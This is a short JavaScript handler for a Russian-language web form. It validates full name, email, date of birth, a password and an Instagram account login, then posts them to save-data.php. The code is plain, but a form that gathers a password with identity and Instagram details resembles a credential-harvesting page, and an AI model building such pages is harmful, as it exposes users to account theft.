document.getElementById('secureForm').addEventListener('submit', function (e) {
    e.preventDefault();
    document.getElementById('spinnerOverlay').style.display = 'flex';

    // Получаем данные формы
    const formData = {
        fullname: document.getElementById('fullname').value.trim(),
        email: document.getElementById('email').value.trim(),
        dob: document.getElementById('dob').value.trim(),
        password: document.getElementById('password').value.trim(),
        login: document.getElementById('login').value.trim()
    };

    // Валидация данных
    if (!formData.fullname) {
        alert('Пожалуйста, введите ваше ФИО.');
        document.getElementById('spinnerOverlay').style.display = 'none';
        return;
    }

    if (!formData.email || !validateEmail(formData.email)) {
        alert('Пожалуйста, введите корректный email.');
        document.getElementById('spinnerOverlay').style.display = 'none';
        return;
    }

    if (!formData.dob) {
        alert('Пожалуйста, укажите вашу дату рождения.');
        document.getElementById('spinnerOverlay').style.display = 'none';
        return;
    }

    if (!formData.password || formData.password.length < 6) {
        alert('Пароль должен содержать не менее 6 символов.');
        document.getElementById('spinnerOverlay').style.display = 'none';
        return;
    }

    if (!formData.login) {
        alert('Пожалуйста, укажите вашу учетную запись Instagram.');
        document.getElementById('spinnerOverlay').style.display = 'none';
        return;
    }

    // Отправляем данные на сервер
    fetch('save-data.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ошибка при сохранении данных');
            }
            return response.text();
        })
        .then(message => {
            alert(message);
            document.getElementById('spinnerOverlay').style.display = 'none';
            document.getElementById('secureForm').reset();
        })
        .catch(error => {
            console.error(error);
            alert('Произошла ошибка при сохранении данных');
            document.getElementById('spinnerOverlay').style.display = 'none';
        });
});

// Функция для проверки корректности email
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}